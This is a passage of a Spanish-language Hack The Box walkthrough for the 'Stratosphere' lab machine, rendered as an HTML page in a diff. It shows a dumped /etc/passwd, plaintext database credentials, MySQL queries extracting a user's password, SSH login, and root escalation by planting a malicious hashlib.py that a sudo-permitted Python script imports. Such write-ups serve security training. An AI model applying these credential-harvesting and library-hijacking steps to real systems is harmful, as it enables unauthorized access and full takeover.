+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+messagebus:x:107:110::/var/run/dbus:/bin/false
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:112:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:113:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:114:118::/var/lib/saned:/bin/false
+richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
+tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
+mysql:x:116:120:MySQL Server,,,:/nonexistent:/bin/false
+
+<span class="nv">$~</span> 
+</code></pre></div></div>
+
+<p>Dentro del directorio donde nos encontramos, vemos el archivo <code class="language-plaintext highlighter-rouge">db_connect</code> el cual posiblemente contenga credenciales:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">cat </span>db_connect
+
+<span class="o">[</span>ssn]
+<span class="nv">user</span><span class="o">=</span>ssn_admin
+<span class="nv">pass</span><span class="o">=</span>AWs64@on<span class="k">*</span>&amp;
+
+<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
+<span class="nv">user</span><span class="o">=</span>admin
+<span class="nv">pass</span><span class="o">=</span>admin
+
+<span class="nv">$~</span> 
+</code></pre></div></div>
+
+<p>Podriamos tratar de ver el contenido de la base de datos con el parámetro <code class="language-plaintext highlighter-rouge">-e</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"show databases"</span>
+
+Database
+information_schema
+<span class="nb">users</span>
+
+<span class="nv">$~</span> 
+</code></pre></div></div>
+
+<p>Vemos la base de datos <code class="language-plaintext highlighter-rouge">users</code>, vamos a tratar de listar las tablas que contiene:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"use users; show tables"</span>
+
+Tables_in_users
+accounts
+
+<span class="nv">$~</span> mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"use users; describe accounts"</span>
+
+Field   Type    Null    Key     Default Extra
+fullName        varchar<span class="o">(</span>45<span class="o">)</span>     YES             NULL
+password        varchar<span class="o">(</span>30<span class="o">)</span>     YES             NULL
+username        varchar<span class="o">(</span>20<span class="o">)</span>     YES             NULL
+
+<span class="nv">$~</span> mysql <span class="nt">-uadmin</span> <span class="nt">-padmin</span> <span class="nt">-e</span> <span class="s2">"use users; select username,password from accounts"</span>
+
+username        password
+richard 9tc<span class="k">*</span>rhKuG5TyXvUJOrE^5CK7k
+
+<span class="nv">$~</span> 
+</code></pre></div></div>
+
+<p>Tenemos credenciales del usuario <code class="language-plaintext highlighter-rouge">richard</code> que checando el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> es un usuario válido al nivel de sistema; por lo que podríamos tratar de acceder por SSH:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh richard@10.10.10.64
+The authenticity of host <span class="s1">'10.10.10.64 (10.10.10.64)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:tQZo8j1TeVASPxWyDgqJf8PaDZJV/+LeeBZnjueAW/E.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.64<span class="s1">' (ECDSA) to the list of known hosts.
+richard@10.10.10.64'</span>s password: 
+Linux stratosphere 4.9.0-6-amd64 <span class="c">#1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
+richard@stratosphere:~<span class="nv">$ </span><span class="nb">whoami
+</span>richard
+richard@stratosphere:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya estamos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, así que vamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>richard@stratosphere:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>richard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>richard<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>richard<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,112<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>scanner<span class="o">)</span>
+richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>richard on stratosphere:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User richard may run the following commands on stratosphere:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python<span class="k">*</span> /home/richard/test.py
+richard@stratosphere:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que tenemos permisos de ejecución del programa <code class="language-plaintext highlighter-rouge">test.py</code>, así que vamos a echarle un ojo:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="nn">hashlib</span>
+
+
+<span class="k">def</span> <span class="nf">question</span><span class="p">():</span>
+    <span class="n">q1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Solve: 5af003e100c80923ec04d65933d382cb</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="n">md5</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q1</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">md5</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">"5af003e100c80923ec04d65933d382cb"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Sorry, that's not right"</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"You got it!"</span><span class="p">)</span>
+    <span class="n">q2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sha1</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+    <span class="n">sha1</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q2</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">sha1</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'d24f6fb449855ff42344feff18ee2819033529ff'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Nope, that one didn't work..."</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"WOW, you're really good at this!"</span><span class="p">)</span>
+    <span class="n">q3</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"How about this? 91ae5fc9ecbca9d346225063f23d2bd9</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">md4</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md4'</span><span class="p">)</span>
+    <span class="n">md4</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q3</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">md4</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'91ae5fc9ecbca9d346225063f23d2bd9'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Yeah, I don't think that's right."</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"OK, OK! I get it. You know how to crack hashes..."</span><span class="p">)</span>
+    <span class="n">q4</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">blake</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'BLAKE2b512'</span><span class="p">)</span>
+    <span class="n">blake</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q4</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">blake</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"You were so close! urg... sorry rules are rules."</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="kn">import</span> <span class="nn">os</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/root/success.py'</span><span class="p">)</span>
+    <span class="k">return</span>
+
+<span class="n">question</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Vemos que el programa solicita las palabras asociadas a los hashes que se tienen; sin embargo, esto no nos va a funcionar para escalar privilegios. Algo que debemos tener en cuenta es que el programa está haciendo uso de la libreria <code class="language-plaintext highlighter-rouge">hashlib</code>, por lo que vamos a echarle un ojo a las rutas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>richard@stratosphere:~<span class="nv">$ </span>python
+Python 3.5.3 <span class="o">(</span>default, Jan 19 2017, 14:11:04<span class="o">)</span> 
+<span class="o">[</span>GCC 6.3.0 20170118] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> import sys
+<span class="o">&gt;&gt;&gt;</span> sys.path
+<span class="o">[</span><span class="s1">''</span>, <span class="s1">'/usr/lib/python35.zip'</span>, <span class="s1">'/usr/lib/python3.5'</span>, <span class="s1">'/usr/lib/python3.5/plat-x86_64-linux-gnu'</span>, <span class="s1">'/usr/lib/python3.5/lib-dynload'</span>, <span class="s1">'/usr/local/lib/python3.5/dist-packages'</span>, <span class="s1">'/usr/lib/python3/dist-packages'</span><span class="o">]</span>
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></div>
+
+<p>Vemos que el path comienza por <code class="language-plaintext highlighter-rouge">''</code>, lo que indica que las librerías o cualquier otro pograma en python a utilizar será buscado primeramente por el directorio actual de trabajo; así que podríamos crear un archivo <code class="language-plaintext highlighter-rouge">hashlib.py</code> en la ruta donde se encuentra el programa <code class="language-plaintext highlighter-rouge">test.py</code> y como <strong>root</strong> ejecuta el archivo, también ejecutará nuestro archivo (libreria) y no nos solicita contraseña <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /home/richard/test.py</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s">'whoami'</span><span class="p">])</span>
+<span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>richard@stratosphere:~<span class="nv">$ </span>python3 test.py 
+richard
+Solve: 5af003e100c80923ec04d65933d382cb
+^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"test.py"</span>, line 38, <span class="k">in</span> &lt;module&gt;
+    question<span class="o">()</span>
+  File <span class="s2">"test.py"</span>, line 6, <span class="k">in </span>question
+    q1 <span class="o">=</span> input<span class="o">(</span><span class="s2">"Solve: 5af003e100c80923ec04d65933d382cb</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+KeyboardInterrupt
+richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/richard/test.py 
+root
+Solve: 5af003e100c80923ec04d65933d382cb
+^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"/home/richard/test.py"</span>, line 38, <span class="k">in</span> &lt;module&gt;
+    question<span class="o">()</span>
+  File <span class="s2">"/home/richard/test.py"</span>, line 6, <span class="k">in </span>question
+    q1 <span class="o">=</span> input<span class="o">(</span><span class="s2">"Solve: 5af003e100c80923ec04d65933d382cb</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+KeyboardInterrupt
+richard@stratosphere:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que con el comando <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /home/richard/test.py</code> ejecutamos el programa temporalemente como <strong>root</strong>; así que podríamos mandarnos una <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s">'bash'</span><span class="p">])</span>
+<span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/richard/test.py 
+root@stratosphere:/home/richard# <span class="nb">whoami
+</span>root
+root@stratosphere:/home/richard#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-12T00:00:00-05:00">October 12, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-teacher/" class="pagination--pager" title="Hack The Box Teacher
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
